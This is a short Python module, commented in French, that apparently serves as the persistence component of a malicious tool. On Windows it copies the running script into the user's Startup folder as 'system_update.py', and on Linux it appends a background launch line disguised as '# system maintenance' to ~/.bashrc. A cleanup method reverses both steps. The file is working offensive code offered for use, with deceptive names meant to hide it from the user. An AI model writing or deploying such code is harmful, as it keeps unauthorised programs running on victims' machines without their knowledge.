import os
import sys
import shutil
import platform

class Persistence:
    def __init__(self):
        self.os_type = platform.system().lower()
        
    def install_persistence(self):
        # installe la persistance selon l'OS
        try:
            if self.os_type == "windows":
                return self._windows_persistence()
            elif self.os_type == "linux":
                return self._linux_persistence()
            else:
                return False
        except Exception:
            return False
            
    def _windows_persistence(self):
        # persistance windows via startup folder
        try:
            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            
            if os.path.exists(startup_folder):
                script_path = sys.argv[0]
                target_path = os.path.join(startup_folder, "system_update.py")
                shutil.copy2(script_path, target_path)
                return True
            return False
        except:
            return False
            
    def _linux_persistence(self):
        # persistance linux via .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            script_path = os.path.abspath(sys.argv[0])
            
            # verifie si deja present
            with open(bashrc_path, "r") as f:
                content = f.read()
                
            if script_path not in content:
                with open(bashrc_path, "a") as f:
                    f.write(f"\n# system maintenance\npython3 {script_path} &\n")
                return True
            return True
        except:
            return False
            
    def remove_persistence(self):
        # supprime la persistance
        try:
            if self.os_type == "windows":
                startup_folder = os.path.join(
                    os.getenv('APPDATA'),
                    'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                )
                target_path = os.path.join(startup_folder, "system_update.py")
                if os.path.exists(target_path):
                    os.remove(target_path)
                    
            elif self.os_type == "linux":
                bashrc_path = os.path.expanduser("~/.bashrc")
                script_path = os.path.abspath(sys.argv[0])
                
                with open(bashrc_path, "r") as f:
                    lines = f.readlines()
                    
                # supprime les lignes contenant le script
                filtered_lines = [line for line in lines if script_path not in line]
                
                with open(bashrc_path, "w") as f:
                    f.writelines(filtered_lines)
                    
            return True
        except:
            return False